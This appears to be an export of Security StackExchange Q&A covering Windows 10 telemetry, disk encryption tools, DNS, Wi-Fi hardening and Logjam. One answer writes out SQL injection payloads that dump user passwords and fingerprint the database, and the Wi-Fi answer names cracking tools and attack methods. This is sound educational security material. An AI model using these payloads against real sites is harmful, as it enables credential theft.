  <li><p>install or use Program software and services, we may collect information about your device and applications and use it for purposes
  such as determining or improving compatibility (e.g., to help devices
  and apps work together),</p></li>
  <li><p>when you use voice input features like speech-to-text, we may collect voice information and use it for purposes such as improving
  speech processing (e.g., to help the service better translate speech
  into text),</p></li>
  <li><p>when you open a file, we may collect information about the file, the application used to open the file, and how long it takes to use it
  for purposes such as improving performance (e.g., to help retrieve
  documents more quickly), or</p></li>
  <li><p>when you input text, handwrite notes, or ink comments, we may collect samples of your input to improve these input features, (e.g.,
  to help improve the accuracy of autocomplete and spellcheck).</p></li>
  </ul>
</blockquote>

<p>This is so serious that even some political parties here in <strong>France</strong> that have nothing to do with technologies <a href=""http://newtechnologies2015.blogspot.fi/2015/07/windows-10-marine-le-pen-denounced.html"" rel=""nofollow noreferrer"">denounced Microsoft Windows 10</a> practices.</p>

<p>A member claimed that the statement above does not concern the shipped version of Windows 10. </p>

<p>Well:</p>

<ol>
<li>We have not been provided any proof that Microsoft removed all those monitoring modules of its Windows 10 beta version in the final release. And, since Windows is closed-source, there's no way for us to check ourselves.  </li>
<li>The media has reported a history of Microsoft spying as its practice (e.g. <a href=""http://www.cnet.com/news/microsoft-china-clash-over-windows-8-and-charges-of-backdoor-spying/"" rel=""nofollow noreferrer"">Microsoft, China clash over Windows 8, backdoor-spying charges</a>, also <a href=""http://www.washingtonsblog.com/2013/06/microsoft-programmed-in-nsa-backdoor-in-windows-by-1999.html"" rel=""nofollow noreferrer"">NSA Built Back Door In All Windows Software by 1999</a>). </li>
<li>For the shipped version of Windows 10, we can see the same information with smoother words: <a href=""http://www.microsoft.com/en-us/privacystatement/default.aspx"" rel=""nofollow noreferrer"">Privacy Statement</a></li>
</ol>

<p>Additionally, after the release of the shipped version of Microsoft Windows 10, this is what was written in Microsoft Windows 10 Privacy Policy:</p>

<blockquote>
  <p>We will access, disclose and preserve personal data, including your
  content (such as the content of your emails, other private
  communications or files in private folders), when we have a good faith
  belief that doing so is necessary to protect our customers or enforce
  the terms governing the use of the services,</p>
</blockquote>

<p><strong><a href=""http://www.telegraph.co.uk/technology/microsoft/windows/11782807/windows-10-privacy.html"" rel=""nofollow noreferrer"">Only</a></strong> by the start of this August, and after lot of organizations and even political parties complained about Windows 10 being a spyware, Microsoft changed its privacy policy statement to softer terms to which I linked to. But is this change of policy statement followed by retrieving Windows 10 from the market and replacing it by a new one? Of course not.</p>

<p>Note that the last paragraph I quoted is only still available in external websites including famous newspapers by the start of this August (which thing means after Microsoft started already to sell its Windows 10), but we do not find this paragraph anymore in the updated version of the privacy policy statement anymore. So Microsoft removed it already.</p>

<p>Update:</p>

<p>From <a href=""http://windows.microsoft.com/en-us/windows/preview-privacy-statement"" rel=""nofollow noreferrer"">Windows 10 feedback, diagnostics, and privacy: FAQ</a> (shipped version of Windows 10, NOT Pre-Release Preview), we can also  read regarding <strong>Diagnostics Tracking Service</strong>:</p>

<blockquote>
  <p>As you use Windows, we collect performance and usage information that
  helps us identify and troubleshoot problems as well as improve our
  products and services. We recommend that you select <strong>Full</strong> for this
  setting.</p>
  
  <ul>
  <li><p><strong>Basic</strong> information is data that is vital to the operation of Windows. This data helps keep Windows and apps running properly by
  letting Microsoft know the capabilities of your device, what is
  installed, and whether Windows is operating correctly. This option
  also turns on basic error reporting back to Microsoft. If you select
  this option, we’ll be able to provide updates to Windows (through
  Windows Update, including malicious software protection by the
  Malicious Software Removal Tool), but some apps and features may not
  work correctly or at all.</p></li>
  <li><p><strong>Enhanced</strong> data includes all Basic data plus data about how you use Windows, such as how frequently or how long you use certain features
  or apps and which apps you use most often. This option also lets us
  collect enhanced diagnostic information, such as the memory state of
  your device when a system or app crash occurs, as well as measure
  reliability of devices, the operating system, and apps. If you select
  this option, we’ll be able to provide you with an enhanced and
  personalized Windows experience.</p></li>
  <li><p><strong>Full</strong> data includes all Basic and Enhanced data, and also turns on advanced diagnostic features that collect additional data from your
  device, such as system files or memory snapshots, which may
  unintentionally include parts of a document you were working on when a
  problem occurred. This information helps us further troubleshoot and
  fix problems. If an error report contains personal data, we won’t use
  that information to identify, contact, or target advertising to you.
  This is the recommended option for the best Windows experience and the
  most effective troubleshooting.</p></li>
  </ul>
</blockquote>

<p>Note that only on Enterprise Edition one can turn <strong><em>Diagnostics Tracking Service</em></strong> off totally. </p>

<p>Diagnostics Tracking Service available in Windows 8.1, Windows Server 2012 R2, Windows 7 Service Pack 1 (SP1), and Windows Server 2008 R2 SP1 and Windows 10. The quoted paragraphs concern the Diagnostics Tracking Service mechanism in which other modules, apart from Telemetry, are included.</p>

<p>Diagnostics Tracking Service consists in these files:</p>

<ul>
<li>telemetry.asm-windowsdefault.json</li>
<li>diagtrack.dll</li>
<li>utc.app.json</li>
<li>utcresources.dll</li>
</ul>

<p>Note that the answer below claiming that nothing private is collected by Windows 10 as a qualified user may listen to the traffic of his Windows operating system is wrong. It is impossible to know what Windows collects and sends permanently. Windows does not stop sending  information on his/her behalf as this study shows: Even when told not to, Windows 10 just can’t stop talking to Microsoft. But still what the official documentation describes is not very good for the user such as when Windows takes <em>system files or <strong>MEMORY SNAPSHOTS</strong>, which may unintentionally include <strong>PARTS OF A DOCUMENT YOU WERE WORKING ON</strong> on when a problem occurred</em> (From: <a href=""https://security.stackexchange.com/questions/98172/what-are-the-privacy-and-security-implications-of-windows-telemetry"">What are the privacy and security implications of Windows Telemetry</a>) </p>
","96715"
"Is there a reason to use TrueCrypt over VeraCrypt?","45686","","<p>I am looking to encrypt a few drives of mine, and my ONLY interest is security.  It is OK if my VeraCrypt volumes are not compatible with TrueCrypt, and vice versa.</p>

<p>There is a lot of talk about ""TrueCrypt is dead"" and it seems there are two forks out there now gaining momentum.  The one more interesting to me is VeraCrypt, and from the research I have done, this looks like the ""more secure"" option.  But is that so?</p>

<p>That is why I am asking you all here.  I know what VeraCrypt claims, I know they say they do more hash iterations of the password to derive the encryption keys.  That sounds nice and all, but...</p>

<p>Does anyone have real world experience using Veracrypt and is it as good as advertised?  How does it compare to TrueCrypt?</p>

<p>Does anyone have a security reason why they would choose TrueCrypt over VeraCrypt?  Any reasons at all why TrueCrypt is preferable to you?</p>

<p>I'm not on the ""TrueCrypt is dead"" bandwagon, I am just in trying to be progressive, so I would choose a newer ""better"" option if it is available.  But with that being said, I would also choose to go with the older option if it is actually better than the newer options.  Your thoughts?</p>
","<p>I would still choose TrueCrypt for a matter of <strong>trust</strong> and the ""many eyes"" theory:</p>

<ul>
<li><p>After the ""TrueCrypt scandal"" everyone started looking at the source for backdoors.</p></li>
<li><p>The TrueCrypt <a href=""http://istruecryptauditedyet.com/"">audit</a> finished on April 2, 2015. They found low-risk vulnerabilities, including some that affect the bootloader full-disk-encryption feature, though there is no evidence of backdoors.</p></li>
<li><p>If VeraCrypt start changing TrueCrypt fast, they may introduce a few vulnerabilities. Since VeraCrypt is currently less popular than TrueCrypt, there are 'less eyes' watching at the VeraCrypt source code changes.</p></li>
<li><p>I consider that TrueCrypt 7.1a have all the features I need. An audited TrueCrypt with the vulnerabilities fixed would be the perfect choice. Unless I personally watch VeraCrypt source code diffs, it would require an audit on the changes, or a high increase in popularity, or many years of maintenance and active community to make me trust them more than the good old TrueCrypt.</p></li>
<li><p>The increase in iterations to mitigate brute force attacks only affects performance. If you chose a 64-char random password, 1 million years of brute forcing or 10 million years is the same from a security stand point.</p></li>
</ul>

<p>(I downloaded the public key of TrueCrypt admin years before the scandal. So I can download a copy of TrueCrypt 7.1a from any source and verify its authenticity)</p>

<p>This answer may change after they publish new results from the audit. Also, if you are the VeraCrypt dev, the trust argument doesn't apply (because you trust yourself).</p>
","72635"
"What is the difference between authenticity and non-repudiation?","45457","","<p>I'm new to infosec and doing some reading. Not surprisingly one starting point was wikipedia. <a href=""http://en.wikipedia.org/wiki/Information_security#Confidentiality"">In this article</a>, <strong>authenticity</strong> and <strong>non-repudiation</strong> are listed as 2 separate 'Basic concepts'. My understanding is that you cannot achieve non-repudiation by not knowing which parties are involved, which requires authenticity to be in place. In that sense, I see authenticity as a sub component of non-repudiation.</p>

<p>Have you got examples backing up the approach that these 2 concepts are fundamentally separate?</p>
","<p>Authentication and non-repudiation are two different sorts of concepts.</p>

<ul>
<li><p>Authentication is a <strong>technical concept</strong>: e.g., it can be solved through cryptography.</p></li>
<li><p>Non-repudiation is a <strong>legal concept</strong>: e.g., it can only be solved through legal and social processes (possibly aided by technology).</p></li>
</ul>

<p>Some people have been taught that non-repudiation can be provided through crypto-mathematics alone.  <a href=""https://security.stackexchange.com/questions/1786/how-to-achieve-non-repudiation/6108#6108"">However, that is not correct.</a></p>
","6766"
"Is it generally a bad idea to encrypt database fields?","45450","","<p>I work on a tiny company, it's literally me (the programmer) and the owner. The owner has asked me to encrypt several fields in a database to protect the customers data. This is a web application that helps law firms manage their data, so basically it stores persons and lawsuits information (who is being sued, why, for how much). He considers this sensitive information that should not be easily seen. His fear is ""I don't want unauthorized people to see this information"". Only other law firms could be interested in this data, so this shouldn't be as important as credit cards, for example.</p>

<p>I've read a lot about this on the web and I was thinking on simply using symmetric encryption on these fields, so that the performance isn't that bad. The key would be stored on the server. However, <a href=""https://stackoverflow.com/questions/3979385/a-good-way-to-encrypt-database-fields-django"">this</a> thread on stackoverflow says this is a bad idea.</p>

<p>I don't understand how encrypting the fields and saving the key on server can be so useless. I don't fear the discs being stolen because they are on Amazon EC2. I'm no security expert, but in my opinion, if anything could go wrong, I'd say the database leaks. Even then, the important information would be encrypted. Now if the guy managed to even hack to my EC2 server, well, I guess then there would be little to no protection I could do to help this. As we are a tiny company, we only have one server doing everything, from serving the pages to storing the data.</p>

<p>My question is, considering we can only afford one server, is encrypting those fields with a symmetric key, which is saved on this server, ok?</p>
","<p><strong>General comments.</strong> It sounds like it would be helpful for you and your boss to learn some basic security concepts, before proceeding.  Security is a specialized field.  You wouldn't ask a random person on the street to perform open-heart surgery on you; and you shouldn't expect an average software developer to know how to secure your systems.</p>

<p>I sense some misconceptions here.  For instance, it sounds like your boss has equated security with cryptography.  But this is a mistake.  As Bruce Schneier has emphasized, <em>Cryptography is not magic pixie dust that you can sprinkle on a system to make it secure</em>.  And as Roger Needham once famously said, <em>If you think cryptography will solve your problem, either you don't understand cryptography, or you don't understand your problem</em>.</p>

<p>When securing a computer system, one important concept is the <em>threat model</em>.  This means you need to think carefully about what kinds of attacks and adversaries you are trying to stop, and what you aren't.  A failure to think through the threat model clearly can lead to <em>security theater</em>: security mechanisms that look good on first glance, but actually are woefully inadequate in practice.  Good security management often comes down to <em>risk management</em>: careful analysis of what are the most serious risks, and then devising strategies to mitigate or manage those particular risks.</p>

<p>It is also important to understand that security is a weakest-link property: <em>the security of your system is only as strong as the weakest link</em>.  A vulnerability in any one part of the system can compromise the security of the entire system.  This means that there's no one answer that's going to be sufficient to protect your system; instead, to defend your system, you have to get security right in a number of places.</p>

<p><strong>Diving into details.</strong> It sounds like your goals are to prevent unauthorized disclosure of sensitive data.  If so, you're going to need to focus on a number of items.  There's no one simple magic silver bullet that is going to solve this for you; you are going to need to work on application security generally.</p>

<p>Let me suggest some things that should be priorities for you, if I've understood your goals correctly:</p>

<ul>
<li><p><strong>Application security.</strong> You need to start studying up on web application security.  It doesn't matter how much crypto you throw at the problem; if an attacker can find a security hole in your application code, you are hosed.  For background on web application security, OWASP has many excellent resources.  Make sure you learn about the OWASP Top Ten, about XSS, SQL injection, input sanitization/validation, output escaping, whitelisting, and other concepts.</p></li>
<li><p><strong>Access control.</strong> Your web application needs to have solid access controls, to ensure that one user of your system cannot access information of another user (without authorization).  The details of this will depend upon the specifics of your particular system, so if you want additional help on this, you'll probably need to post a separate question with more details about your application and your current strategy for access control.</p></li>
<li><p><strong>Authentication.</strong> Your web application will need a way to authenticate its users.  The standard least-effort scheme is to just use a username and password.  However, this has serious limitations in practice that are well-understood.  If users choose their own passwords, they often choose poor passwords, and this can subvert the security of your system.</p></li>
<li><p><strong>Secure software development lifecycle.</strong> You need to integrate security into the software development process.  When you work out the software architecture, you should be thinking about the security requirements and performing threat modelling and architectural risk analysis.  When writing code, you need to know about common implementation errors that can breach security and make sure to avoid them.  After the software is built, you need to test its security and constantly evaluate how you are doing at security.  When  you deploy the software, your operations folks need to know how to manage it securely.  Microsoft has some excellent resources on the secure software development lifecycle (SDL).  See also BSIMM for more.</p></li>
<li><p><strong>Security assessment.</strong> If you are concerned about security, I suggest having the security of your application assessed.  A simple starting point might be to have someone perform a pentest of your web application, to check for certain kinds of common errors.  This is by no means a guarantee of security, but sometimes it can help serve as a wakeup call if there are many major problems present.  You might look at WhiteHat Security's services; there are also many others who will perform web pentesting.</p></li>
</ul>

<p>If you are getting the sense that this is not a trivial undertaking, I apologize, but that is indeed the case.  On the other hand, the good news is that there are a lot of resources out there, and moreover, you don't need to become an expert-level security guru: you just need to become familiar with some basic concepts and some common security mistakes in web programming, and that will take care of most of your needs.</p>
","16961"
"What is the best home wireless network encryption algorithm to use?","45445","","<p>What is the best home wireless network encryption algorithm to use?  I realize the best answer will probably change over time, and hopefully people can provide updated answers as new standards come out.  So far, my knowledge, as of early 2015 is:</p>

<ul>
<li>WEP - Horrible / outdated, but still a bit better than nothing (or may even be worse than nothing because it provides a false sense of security as pointed out below).</li>
<li>WPA - Provides some security, but probably better to go with WPA2.</li>
<li>WPA2 - Pretty good (especially with AES encryption), but still not perfect.  It is the best I know though for a home network.</li>
</ul>

<p>Are there any better encryption standards to use than WPA2 for a home wireless network, or is that the best there is?  If it is the best there is, is it easy to hack?</p>

<p>If it is true as others indicate that WPA-2 is not adequate, and nothing better exists, it seems like it would be a good idea, perhaps even a good money making opportunity for someone to develop something better!</p>
","<p><strong>From a security perspective, I think you are asking the wrong question.</strong> WPA2 is the basic answer. But it's entirely incomplete! <strong>A more complete answer will view WPA2 as one component of your wireless network defence.</strong> Of course there's strong encryption methods using certificates/vpn etc but these are too difficult for most people to set up and are usually reserved for businesses. So let's assume WPA-2 is the 'best' answer to the basic question. However... as you'll see, there's many weaker points that attackers go for, that ultimately reveal your WPA2 password, so I've included them in the points below. </p>

<blockquote>
  <p>I'm assuming many people will land on this page and see answers saying
  'yeah just use a good password and WPA2 encryption', which is bad
  advice. <strong>Your WPA2 network is still completely vulnerable, as you
  will see:</strong></p>
</blockquote>

<ol>
<li><p>the main thing you can do, is be the <strong>hardest</strong> person to hack around you. That's the biggest deterrent. If I'm going to hack you, but you're <strong>taking too long or are too expensive to crack</strong>, I'll try the next person. This will require some playing around in your router settings.</p></li>
<li><p>I'll assume you would <strong>never use WEP</strong>. 10 minutes on youtube and your mom can crack it.</p></li>
<li><p><strong>Switch off WPS. this is EXTREMELY vulnerable to brute force attacks</strong> and can be hacked in seconds, <strong>even if you are using WPA2 with a ridiculously complex password</strong>. Tools like reaver and revdk3 or bully make light work of these. You're only a little bit more protected if your router supports rate-limiting, which slows down, but doesn't prevent brute force attacks against your routers pin. Better to be safe and just switch WPS off and be 100% safe against these attacks.</p></li>
<li><p><strong>turn off remote access</strong>, DMZ, UPNP, unecessary port forwarding</p></li>
<li><p>turn on, any inbuilt <strong>intrusion detection</strong> systems, <strong>MAC address filtering</strong> (tedious to set up if visitors to your house want access to your wifi (you will have to add your friends device to the router's MAC white-list to enable access) This <strong>can be hacked</strong> by faking a MAC address easily, and getting your MAC is also easy with an airodump-ng scan, but nevertheless, this <strong>will slow down attackers</strong>, requires them to be near a client device (mobile phone, or laptop in the whitelist) It will be pretty effective against some remote attacks.</p></li>
<li><p><strong>have a very long, non-human, complex password.</strong> If you have ever tried to decrypt a password you'll know that it gets exponentially harder to crack a password the more complex, less predictable and longer it is. If your password even remotely resembles a word, or something that could probably be a set of words (see: markov chains) you are done. Also don't bother adding numbers to the end of passwords, then a symbol... these are easily hacked with a dictionary attack with rules that modify the dictionary to flesh it out to cover more passwords. This will take each word or words in the dictionary, and add popular syntax and structures, such as passwords that look like this 'capital letter, lowercase letters, some numbers then a symbol. Cat111$, Cat222# or whatever the cracker wants. These dictionaries are huge, some can be investigated on crackstation or just have a look at Moxie Marlinspikes' cloudcrackr.com. <strong>The goal here is to be 'computationally expensive'. If you cost too much to crack using ultra high speed cloud based cracking computers then you're safe against almost anyone.</strong> So ideally you want to use the maximum 64 characters for your password, and have it look like the most messed up annoying symbol infused piece of incoherent upper-lower-case dribble you've ever seen. You'll probably be safe after 14 characters though, there's quite a bit of entropy here, but it's far easier to add characters than it is to decrypt.</p></li>
<li><p><strong>change your routers default password and SSID</strong>. nobody does this, but everyone should. It's literally the dumbest thing. Also, don't get lazy. and don't keep the router's model number in the SSID, that's just asking for trouble.</p></li>
<li><p>update your router's firmware. Also, <strong>if your router is old. throw it out</strong> and buy a newer one, because it's likely your router is on some website like routerpwn.com/ and you've already lost the battle. Old routers are full of bugs, can be easily denial-of-serviced, don't usually have firewalls or intrusion detection systems and don't usually have brute-force WPS rate limiting among other things. just get a new one.</p></li>
<li><p><strong>learn about evil-twin hacks</strong>. The easiest way to protect against this is to stop your device from auto-connecting. However, this might still snag you. Become familiar with software like wiphishing and airbase-ng, these apps clone your router, then Denial of service your router making your device connect to the attackers cloned router, allowing them to intercept your traffic. They'll usually try to <strong>phish the WPA2 password</strong> from you here. You're safer from these attacks if you <strong>actually know what your router's web console looks like</strong>, because the default phishing pages that come with these types of apps are usually pretty old looking, however a sophisticated attacker can create a good landing page. Put simply, <strong>if your 'router' ever wants you to type in a password don't type it!</strong> You'll only ever be asked when you are creating the password, when you specifically log in to the 192.168.0.1 or 10.1.1.1 user interface, then you are being phished and it's game over. To prevent this attack you could also artificially reduce the range of your router. pull out the antenna's and create a little faraday cage around it, leaving a small area that points to your most ideal wifi position. Alternatively, just use a cable to your laptop or computer until the attacker gives up.</p></li>
<li><p><strong>handshake attacks</strong> are pretty popular, this is where the attacker sends a deauthorisation packet to anyone connected to your router using your password, then when that device (say an iPhone) tries to reconnect, it captures the '4 way handshake' which let's the device and router authenticate using your WPA2 password. This is what hackers use to crack offline using the password attacks in point 6. However if you have used a <strong>strong password</strong> (as described in point 6) then <strong>you've mitigated this attack already</strong>.</p></li>
<li><p>So i've focussed on router based defence, but there's actually even easier ways to be attacked. If the attacker knows who you are, you're screwed. With a tiny bit of <strong>social engineering</strong>, they can find your facebook your email or some other way to contact you and insert some malicious snippet of code that's invisible and hijack your entire computer, which therefore lets them simply check the wifi settings in your computer and obtain the ultra strong password you've spent so long making. One popular method is to send you an email that's junk, and keep sending it until you click unsubscribe, as you usually would for junk mail, except this link is exactly the worst thing to do. You've broken the cardinal law of email. Don't click links in emails. If you have to click one, at least check where it goes first.</p></li>
<li><p>If someone has access to any of your devices, or plugs/gets your to plug a device into your laptop, you're gone. things like <strong>usb sticks</strong> 'usb rubber ducky' can compromise your computer and reveal your WPA2 password to a relatively novice hacker.</p></li>
<li><p>if you use a <strong>wireless keyboard, and you live near an attacking neighbour</strong>, they can use things like <strong>keysweeper</strong> to compromise your wifi, and a lot more. This could be creatively used with an evil twin attack to increase the likelihood you type your password (it listens to wireless keyboard signals). The way to <strong>prevent this attack is to not use a wireless microsoft keyboard.</strong></p></li>
</ol>

<p><strong>There's plenty of other ways, and you'll never prevent them all,</strong> </p>

<p><strong>but</strong> <strong>usually if your router is locked down</strong>, has a nice password, has WPS off, WPA2 on, a strong (new) router with a password, no remote-web access, unnecessary ports are closed, MAC filtering is used and intrusion detection in the router is switched on you will usually prevent even pretty dedicated attackers. <strong>They'll have to try harder methods and will probably just give up.</strong></p>
","79271"
"How to know which database is behind a web application?","45202","","<p>I've read that different databases (mysql, sql server,...) have different vulnerabilities and that they are vulnerable to some specific sql injections.</p>

<p>When attacker try to perform a database attack against a website (like SQL injection) first of all identifies the kind of database, and after performs the attack thinking of the database detected.</p>

<p>How this previous inspection is performed by the attacker? Using some special queries? Are there specific tools? I've not found any information of this.</p>
","<p>Let's say you've got a query like this:</p>

<pre><code>$q=""SELECT username, joindate FROM users WHERE username LIKE '%"" . $search . ""%' LIMIT 20"";
</code></pre>

<p>Now imagine you control <code>$search</code> via a parameter. We would usually make it return the user passwords in the <code>joindate</code> field like this:</p>

<pre><code>$search=""' UNION SELECT username, password FROM users; -- -"";
</code></pre>

<p>As such the query becomes:</p>

<pre><code>SELECT username, joindate FROM users WHERE username LIKE '%' UNION SELECT username, password FROM users; -- - %' LIMIT 20
</code></pre>

<p>The part after the double-hyphen is a comment, so it's ignored, and we get all the username and password combinations appended as new records at the end of the dataset, after the legitimate records. Awesome!</p>

<p>But now we want to adapt this so we can find the database name, for further investigation of their database. On MySQL, we can use the <code>DATABASE()</code> function:</p>

<pre><code>$search=""' UNION SELECT DATABASE(), 1; -- -"";
</code></pre>

<p>The use of <code>1</code> here is to pad the <code>joindate</code> field, which we aren't using.</p>

<p>On MSSQL we can do exactly the same, but with <code>DB_NAME()</code>:</p>

<pre><code>$search=""' UNION SELECT DB_NAME(), 1; -- -"";
</code></pre>

<p>Both of these tricks will append a single row to the end of the result set, containing the database name.</p>

<p>We can then expand this trick to use <code>VERSION()</code> on MySQL or <code>@@VERSION</code> on MSSQL, which returns the current database version. For Oracle and PL/SQL you can check for the existence of the <code>v$version</code> table, simply by doing a query on it and checking for an error.</p>
","25216"
"Pros/cons of using a private DNS vs. a public DNS","45064","","<p>I was wondering why a company should use a private DNS.</p>

<p>In comparison with a public DNS, which advantages does a private one have, and which issues can a public DNS create for a company?</p>

<p>I'm new at these concepts of networks security, so maybe this is a very basic question.</p>
","<p>DNS is a very broad topic, even when you narrow it to have a security focus, however I will attempt to address this in a way that will make most sense to you.  If you are looking for a very high level introduction to DNS, I would suggest <a href=""http://www.verisigninc.com/en_US/why-verisign/education-resources/how-dns-works/index.xhtml"" rel=""nofollow"">this</a>.  For a little bit more detail, <a href=""http://technet.microsoft.com/en-us/library/cc772774%28v=ws.10%29.aspx"" rel=""nofollow"">check this out</a>.  </p>

<p>First of all, you may want to be aware that Private DNS vs. Public DNS can be construed to mean multiple things.  The first thing that I thought of was <a href=""http://en.wikipedia.org/wiki/Split-horizon_DNS"" rel=""nofollow"">split-horizon DNS</a>, where you use the same DNS name for internal and external, but provide different information depending on the source of the DNS request.  There are other options, however, such as choosing to use completely different names internally and externally (such as example.com publicly and example.local privately).  I have seen both implemented in corporations, however having completely separate internal and external DNS servers and namespaces is preferred from a security point of view.  </p>

<p>You would typically want to keep your <a href=""http://tools.ietf.org/html/rfc1918"" rel=""nofollow"">RFC1918 addresses</a> only in your private DNS, as well as your private addresses which are Internet-accessible.  This is less important with IPv4, but with IPv6, having Internet-accessible IP addresses is much more widespread (although <a href=""https://en.wikipedia.org/wiki/Private_network#IPv6"" rel=""nofollow"">not necessary</a>).  </p>

<p>Essentially, it boils down to the fact that you would want a private DNS infrastructure in order to serve employees, so that they would not need to memorize the IPs (or <a href=""http://en.wikipedia.org/wiki/Virtual_IP_address"" rel=""nofollow"">VIPs</a>) of every service.  You would not want these DNS entries available to the Internet because it could be used for <a href=""http://www.isecom.org/mirror/OSSTMM.3.pdf"" rel=""nofollow"">enumeration or discovery</a> (see section 2.6), among many other reasons.  The security of a system is said to boil down to some <a href=""http://en.wikipedia.org/wiki/Information_security#Key_concepts"" rel=""nofollow"">basic concepts</a>, and you must keep in mind that, if you release certain information, if it allows anybody to compromise the CIA triad.  </p>

<p>There is also the option of an <a href=""http://en.wikipedia.org/wiki/Extranet"" rel=""nofollow"">extranet</a> DNS infrastructure, which would be for partner companies, or companies that you do business with on a regular basis.  </p>

<p>Finally, public DNS is provided as a service to your customers, again, so that they will be able to contact whatever it is you are providing.  A couple of security concepts to keep in mind with DNS include:</p>

<ul>
<li><a href=""https://www.cert.be/pro/docs/dns-amplification-attacks-and-open-dns-resolvers"" rel=""nofollow"">DNS Open Resolvers</a> and <a href=""http://scientopia.org/blogs/goodmath/2013/04/08/what-the-heck-is-a-dns-amplification-dos-attack/"" rel=""nofollow"">Amplification attacks</a></li>
<li><a href=""https://en.wikipedia.org/wiki/DNS_spoofing#Cache_poisoning_attacks"" rel=""nofollow"">DNS Cache Poisoning Attacks</a></li>
<li><a href=""http://www.sans.org/reading_room/whitepapers/dns/securing-dns-zone-transfer_868"" rel=""nofollow"">Zone transfers</a> from rogue DNS servers</li>
</ul>

<p>There are many, many more types of attack when discussing DNS, but I feel like the previous few are a good starting point.  If you are interested in DNS security, I would also point you to <a href=""http://www.sans.org/reading_room/whitepapers/dns/security-issues-dns_1069"" rel=""nofollow"">this write-up</a>, and also <a href=""http://en.wikipedia.org/wiki/Domain_Name_System_Security_Extensions"" rel=""nofollow"">DNSSEC</a>.  </p>
","39507"
"What is Logjam and how do I prevent it?","44975","","<p>I heard there is a ""new"" TLS vulnerability named <a href=""https://weakdh.org/"">Logjam</a>, what does it do and how do I prevent it?</p>
","<p><strong>In a nutshell:</strong> SSL/TLS client and server agree to use some weak crypto. Well, turns out that weak crypto is <em>weak</em>.</p>

<hr />

<p><strong>In more details:</strong> In SSL/TLS, the client sends a list of supported cipher suites, and the server chooses one. At the end of the initial handshake, some <code>Finished</code> messages are exchanged, encrypted and protected with the newly negotiated crypto algorithms, and the <em>contents</em> of these messages is a hash of all the preceding messages. The idea is that an active attacker (a <a href=""http://en.wikipedia.org/wiki/Man-in-the-middle_attack"">MitM</a>) could try to manipulate the list of cipher suites sent by the client to remove all ""strong"" crypto suites, keeping only the weakest that both client and server support. However, this would break the <code>Finished</code> messages. Thus, these messages are meant (among other roles) to detect such <em>downgrade attacks</em>.</p>

<p>This theory is fine, unless the client and server both support a cipher suite that is so weak that the MitM can break it <em>right away</em>, unravel the whole crypto layer, and fixed in real-time the <code>Finished</code> message. This is what happens here.</p>

<hr />

<p><strong>With even more details:</strong> When using the ""DHE"" cipher suites (as in ""Diffie-Hellman Ephemeral""), the server sends the ""DH parameters"" (modulus and generator) with which client and server will perform a <a href=""http://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange"">Diffie-Hellman key exchange</a>. The server further more signs that message with its private key (usually an RSA key, since everybody uses RSA in practice). The client verifies that signature (the public key is the one in the server certificate), then proceeds to use the DH parameter to complete the key exchange.</p>

<p>It so happens that in previous century, there were some rather strict US export regulations on crypto, and this prompted ""export cipher suites"", i.e. weak crypto that was compatible with these regulations. Many SSL servers still support these ""export cipher suites"". In particular, some cipher suites that use DHE and mandate a DH modulus of no more than 512 bits. Moreover, most SSL server use the <em>same</em> modulus, because using the one provided with the SSL library is easier than generating your own. Reusing the same modulus as everybody else is not a big issue; DH tolerates that just fine. However, it means that if an attacker invests a lot of computations in breaking one DH instance that uses a given modulus <em>p</em>, the same attacker can reuse almost all of the work for breaking other instances that use the same modulus <em>p</em>.</p>

<p>So the attack runs like this:</p>

<ul>
<li>Attacker is in MitM position; he can modify data flows in real-time.</li>
<li>Attacker alters the list of cipher suites sent by the client to specify the use of an export DHE cipher suite.</li>
<li>The server complies and sends a 512-bit modulus <em>p</em>.</li>
<li>The client is still persuaded that it is doing a non-export DHE, but a DH modulus is a DH modulus, so the client accepts the weak/export modulus from the server just fine.</li>
<li>Attacker uses his precomputations on that value <em>p</em> to break the DH in real time and fix the <code>Finished</code> messages.</li>
</ul>

<p>The <a href=""https://weakdh.org/imperfect-forward-secrecy.pdf"">Logjam article</a> authors call this a ""protocol flaw"" because the <code>ServerKeyExchange</code> message that contains the export DH parameters is not tagged as ""for export"", and thus is indistinguishable (save for the modulus length) from a <code>ServerKeyExchange</code> message that contains non-export DH parameters. However, I would say that the real flaw is not there; the real problem is that the client and server accept to use a 512-bit DH modulus even though they both know that it is weak.</p>

<hr />

<p><strong>What should you do ?</strong></p>

<p>Well, the same thing as always: install patches from your software vendors. This should go without saying.</p>

<p>On the client side, Microsoft has already patched Internet Explorer to refuse to use a too small modulus. A fix for firefox in the form of a plugin by Mozilla is available now <a href=""https://addons.mozilla.org/en-US/firefox/addon/disable-dhe/"">here</a>. It is expected that other browser vendors (Opera, Chrome...) will soon follow.</p>

<p>On the server side, you can explicitly disable support for ""export"" cipher suites, and generate your own DH parameters. See <a href=""https://weakdh.org/sysadmin.html"">that page</a> for details. Note that IIS is kinda immune to all this because it apparently never supported DHE cipher suites with anything else than a DSS server certificate, and nobody uses DSS server certificates.</p>

<p>Note that <em>ECDHE</em> cipher suites, with ""EC"" meaning ""elliptic curve"", are not at risk here, because:</p>

<ul>
<li>There are no ""export"" ECDHE cipher suites (ECDHE cipher suites were defined after the US export regulations were considerably lifted).</li>
<li>Clients in general support only a few specific curves (usually only two of them, P-256 and P-384) and neither is weak enough to be broken (not now, not in the foreseeable future either).</li>
</ul>

<hr />

<p><strong>And what about the NSA ?</strong></p>

<p>The Logjam researchers include some talk about how some ""attackers with nation-state resources"" could break through 1024-bit DH. This is quite a stretch. In my experience, nation-states indeed have a lot of resources and are good at spending it, but that's not the same thing as succeeding at breaking hard crypto.</p>

<p>Nevertheless, if you fear that 1024-bit DH is ""too weak"", go for 2048-bit (this is recommended anyway), or ECDHE.</p>

<p>Or simply accept that people with overwhelming resources really have <em>overwhelming resources</em> and won't be defeated by a simple modulus size. Those who can spend billions of dollars for a cracking machines can also bribe your kids with a few hundreds of dollars to go through your computer files and your wallet.</p>
","89702"
"What defines a programming language as useful for hacking?","44916","","<p>I know that scripting languages (<a href=""http://www.perl.org"">Perl</a>, <a href=""http://www.ruby-lang.org/en/"">Ruby</a>, <a href=""http://www.python.org"">Python</a>, javascript, and even Lua!!!) are most suitable for hacking and penetration testing.</p>

<p>My question is: <strong>What is it that makes those languages suitable?</strong> From what I know, they are slower than other languages, and operate at a higher abstraction level, which means they are too far from the hardware. <em>The only reason I could think is because of their advanced string manipulation capabilities, but I believe that other languages have such capabilities.</em></p>
